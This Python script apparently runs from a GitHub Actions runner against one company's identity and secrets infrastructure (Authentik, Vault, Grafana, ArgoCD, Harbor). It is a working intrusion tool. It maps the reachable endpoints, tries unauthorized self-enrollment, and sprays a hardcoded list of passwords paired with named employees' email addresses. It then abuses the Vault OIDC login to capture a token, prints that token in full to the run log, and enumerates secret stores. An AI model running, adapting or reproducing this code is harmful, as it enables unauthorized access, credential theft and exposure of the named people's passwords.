#!/usr/bin/env python3
# ct49 egress49 — GitHub Actions runner (Azure egress) vantage probe
# runs inside ubuntu-latest runner; prints everything to stdout for run log harvesting.
import json, sys, time, urllib.parse, traceback

try:
    import requests
except Exception:
    requests = None

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
H = {"User-Agent": UA, "Accept": "*/*"}
AUTH = "https://authentik.api.cardtonic.com"
VAULT = "https://vault.api.cardtonic.com"
PAUSE = 0.4

def p(*a):
    print(*a, flush=True)

def short(b, n=200):
    if b is None:
        return ""
    if isinstance(b, str):
        b = b.encode()
    s = b[:n]
    try:
        return s.decode("utf-8", "replace").replace("\n", "\\n").replace("\r", "")
    except Exception:
        return repr(s)

def one(sess, method, url, nbytes=200, **kw):
    """do a request, return dict + print one line"""
    kw.setdefault("timeout", 15)
    kw.setdefault("allow_redirects", False)
    hdrs = dict(H)
    hdrs.update(kw.pop("headers", {}) or {})
    try:
        r = sess.request(method, url, headers=hdrs, **kw)
        body = r.content
        cf = r.headers.get("cf-ray", "-")
        srv = (r.headers.get("server", "-") or "-")
        ct = (r.headers.get("content-type", "-") or "-")
        loc = r.headers.get("location", "")
        p("PROBE|%s|%s|%s|len=%d|ct=%s|server=%s|cf-ray=%s|loc=%s|first=%s" % (
            method, url, r.status_code, len(body), ct[:40], srv[:30], cf, loc[:160], short(body, nbytes)))
        return {"status": r.status_code, "body": body, "headers": dict(r.headers), "url": url}
    except Exception as e:
        p("PROBE|%s|%s|ERR|%s" % (method, url, repr(e)[:200]))
        return {"status": 0, "body": b"", "headers": {}, "url": url, "err": repr(e)}

def jbody(res):
    try:
        return json.loads(res["body"].decode("utf-8", "replace"))
    except Exception:
        return None

def main():
    t0 = time.time()
    p("### RUNNER INFO ###")
    for u in ("https://ifconfig.me/ip", "https://ipinfo.io/json"):
        one(requests.Session(), "GET", u, nbytes=300)
        time.sleep(PAUSE)

    s = requests.Session()
    p("### PHASE A: EGRESS MATRIX (authentik / grafana / prometheus / argocd / vault / harbor) ###")
    matrix = [
        AUTH + "/-/health/live/",
        AUTH + "/api/v3/root/config/",
        AUTH + "/.well-known/openid-configuration",
        AUTH + "/outpost.goauthentik.io/ping",
        AUTH + "/application/o/authorize/",
        "https://grafana.api.cardtonic.com/api/health",
        "https://grafana.api.cardtonic.com/api/datasources",
        "https://prometheus.api.cardtonic.com/api/v1/targets",
        "https://argocd.api.cardtonic.com/api/version",
        VAULT + "/v1/sys/health",
        "https://harbor.api.cardtonic.com/api/v2.0/systeminfo",
    ]
    res = {}
    for u in matrix:
        res[u] = one(s, "GET", u, nbytes=220)
        time.sleep(PAUSE)

    # decide authentik reachable
    a_status = [res[u]["status"] for u in matrix[:5]]
    a_open = any(0 < st < 400 for st in a_status)
    p("### AUTHENTIK_OPEN=%s statuses=%s ###" % (a_open, a_status))

    session_ok = False
    if a_open:
        p("### PHASE B: AUTHENTIK FLOWS ###")
        EXEC_AUTH = AUTH + "/api/v3/flows/executor/default-authentication-flow/?query=%7B%7D"
        EXEC_ENR = AUTH + "/api/v3/flows/executor/default-source-enrollment/?query=%7B%7D"
        aj = dict(H); aj["Accept"] = "application/json"; aj["Content-Type"] = "application/json"

        r = sess_get(s, EXEC_AUTH, aj)
        js = jbody(r) if r else None
        p("FLOW_AUTH_INIT|status=%s|%s" % (r["status"] if r else 0, json.dumps(js, ensure_ascii=False)[:1200] if js else short(r["body"] if r else b"", 600)))
        time.sleep(PAUSE)
        r = sess_get(s, EXEC_ENR, aj)
        js2 = jbody(r) if r else None
        p("FLOW_ENROLL_INIT|status=%s|%s" % (r["status"] if r else 0, json.dumps(js2, ensure_ascii=False)[:1200] if js2 else short(r["body"] if r else b"", 600)))
        time.sleep(PAUSE)
        r = sess_get(s, AUTH + "/api/v3/core/users/me/", aj)
        p("USERS_ME|status=%s|%s" % (r["status"] if r else 0, short(r["body"] if r else b"", 400)))
        time.sleep(PAUSE)

        # ---------- enrollment attempt ----------
        enrolled = False
        if js2 and isinstance(js2, dict) and js2.get("component") == "ak-stage-prompt":
            fields = [f.get("field_key") for f in js2.get("fields", [])]
            p("ENROLL_FIELDS|%s" % fields)
            reg = {"username": "ct49egress", "email": "ezebright898+ct49eg@gmail.com",
                   "password": "Ct49Egress!2026", "password_repeat": "Ct49Egress!2026",
                   "name": "ct49 egress"}
            rr = post_json(s, EXEC_ENR, reg, aj)
            p("ENROLL_POST|status=%s|%s" % (rr["status"], short(rr["body"], 800)))
            time.sleep(PAUSE)
            if 200 <= rr["status"] < 400:
                enrolled = True
                # step through any further challenges
                step_flow(s, EXEC_ENR, aj, label="ENROLL")
        elif js2 and isinstance(js2, dict) and js2.get("component"):
            p("ENROLL_COMPONENT|%s" % js2.get("component"))
        else:
            p("ENROLL_RAW|status=%s|%s" % (r["status"] if r else 0, short(r["body"] if r else b"", 600)))

        # ---------- login attempts ----------
        cands = [
            ("akadmin", "akadmin"),
            ("akadmin", "password"),
            ("akadmin", "Tonic2024!"),
            ("akadmin", "Cardtonic@2024"),
            ("akinbiyi@thetonictech.com", "Computer7,"),
            ("george@thetonictech.com", "Password1#,"),
            ("accounts@thetonictech.com", "Computer7,"),
            ("usman@cardtonic.com", "Cardtonic@2024"),
            ("admin@cardtonic.com", "Cardtonic@2024"),
        ]
        for (u, pw) in cands:
            if session_ok:
                break
            try:
                diag = try_login(s, EXEC_AUTH, u, pw, aj)
                p("LOGIN|%s|%s|%s" % (u, pw, diag))
            except Exception as e:
                p("LOGIN|%s|ERR|%r" % (u, e))
            session_ok = any(k.startswith("authentik_session") for k in s.cookies.keys())
            time.sleep(PAUSE)

        if session_ok or enrolled:
            p("### PHASE C: IDENTITY ###")
            cookie_names = sorted(s.cookies.keys())
            p("COOKIES|%s" % cookie_names)
            r = sess_get(s, AUTH + "/api/v3/core/users/me/", aj)
            p("IDENTITY|status=%s|%s" % (r["status"], short(r["body"], 800)))
            time.sleep(PAUSE)
            r = sess_get(s, AUTH + "/api/v3/core/groups/", aj)
            p("GROUPS|status=%s|%s" % (r["status"], short(r["body"], 600)))
            time.sleep(PAUSE)

    # ---------- Vault OIDC ----------
    if session_ok or a_open:
        p("### PHASE D: VAULT OIDC ###")
        sv = requests.Session()
        vh = dict(H); vh["Content-Type"] = "application/json"
        try:
            r = sv.post(VAULT + "/v1/auth/oidc/oidc/auth_url",
                        data=json.dumps({"role": "frontend",
                                         "redirect_uri": VAULT + "/ui/vault/auth/oidc/oidc/callback"}),
                        headers=vh, timeout=15, allow_redirects=False)
            j = jbody({"body": r.content})
            p("AUTH_URL|status=%s|%s" % (r.status_code, short(r.content, 900)))
            au = (j or {}).get("auth_url") or ""
        except Exception as e:
            p("AUTH_URL|ERR|%r" % (e,)); au = ""
        if au:
            time.sleep(PAUSE)
            # need authentik session cookies on the authorize host
            ar = one(s, "GET", au, nbytes=400)
            code = state = None
            loc = ar["headers"].get("location") or ar["headers"].get("Location") or ""
            if loc:
                q = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query)
                code = (q.get("code") or [None])[0]
                state = (q.get("state") or [None])[0]
            p("AUTHORIZE_CODE|code=%s|state=%s" % ((code or "")[:12], state))
            if code:
                time.sleep(PAUSE)
                cb = VAULT + "/v1/auth/oidc/oidc/callback?code=" + urllib.parse.quote(code) + "&state=" + urllib.parse.quote(state or "")
                rc = one(requests.Session(), "GET", cb, nbytes=600)
                tok = ""
                jj = jbody(rc)
                if isinstance(jj, dict):
                    tok = ((jj.get("auth") or {}).get("client_token") or "")
                if tok:
                    p("### VAULT_TOKEN|%s|len=%d ###" % (tok[:8] + "..." + tok[-4:], len(tok)))
                    p("VAULT_TOKEN_FULL|%s" % tok)
                    vault_read(tok)

def sess_get(s, url, hdrs):
    try:
        r = s.get(url, headers=hdrs, timeout=15, allow_redirects=False)
        return {"status": r.status_code, "body": r.content, "headers": dict(r.headers), "url": url}
    except Exception as e:
        return {"status": 0, "body": repr(e).encode(), "headers": {}, "url": url}

def post_json(s, url, obj, hdrs):
    try:
        r = s.post(url, data=json.dumps(obj), headers=hdrs, timeout=15, allow_redirects=False)
        return {"status": r.status_code, "body": r.content, "headers": dict(r.headers), "url": url}
    except Exception as e:
        return {"status": 0, "body": repr(e).encode(), "headers": {}, "url": url}

def step_flow(s, url, hdrs, label="FLOW", maxsteps=4):
    for i in range(maxsteps):
        r = sess_get(s, url, hdrs)
        js = jbody(r)
        p("%s_STEP%d|status=%s|%s" % (label, i, r["status"], json.dumps(js, ensure_ascii=False)[:700] if js else short(r["body"], 400)))
        comp = (js or {}).get("component") if isinstance(js, dict) else None
        if comp in ("xak-flow-redirect",):
            break
        if comp and comp.startswith("ak-stage-prompt"):
            continue
        break

def try_login(s, url, user, pw, hdrs):
    # clean device cookies between attempts (keep flow-less)
    sess_get(s, url, hdrs)  # initial challenge
    time.sleep(0.3)
    r1 = post_json(s, url, {"uid_field": user}, hdrs)
    j1 = jbody(r1)
    comp = (j1 or {}).get("component") if isinstance(j1, dict) else None
    if comp == "ak-stage-password":
        time.sleep(0.3)
        r2 = post_json(s, url, {"password": pw}, hdrs)
        j2 = jbody(r2)
        comp2 = (j2 or {}).get("component") if isinstance(j2, dict) else None
        err2 = (j2 or {}).get("response_errors") if isinstance(j2, dict) else None
        return "identify=password|login status=%s comp=%s err=%s|%s" % (
            r2["status"], comp2, json.dumps(err2, ensure_ascii=False)[:200] if err2 else None, short(r2["body"], 260))
    return "identify status=%s comp=%s|%s" % (r1["status"], comp, short(r1["body"], 300))

def vault_read(tok):
    p("### PHASE E: VAULT READ (masked) ###")
    hd = dict(H); hd["X-Vault-Token"] = tok
    s = requests.Session()
    mounts = None
    for path in ("/v1/sys/mounts", "/v1/sys/auth", "/v1/sys/token/lookup-self"):
        r = one(s, "GET", VAULT + path, headers=hd, nbytes=1500)
        if path == "/v1/sys/mounts":
            j = jbody(r)
            mounts = j
        time.sleep(PAUSE)
    kv = []
    if isinstance(mounts, dict):
        for name, meta in (mounts.get("data") or {}).items():
            if isinstance(meta, dict) and meta.get("type") in ("kv", "generic"):
                kv.append(name.rstrip("/"))
    p("KV_MOUNTS|%s" % kv)
    for m in kv[:6]:
        r = one(s, "GET", VAULT + "/v1/" + m + "/metadata?list=true", headers=hd, nbytes=1200)
        time.sleep(PAUSE)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        p("FATAL|" + traceback.format_exc()[:2000])
    p("### DONE elapsed=%.1fs ###" % (time.time() - t0 if 't0' in dir() else -1))
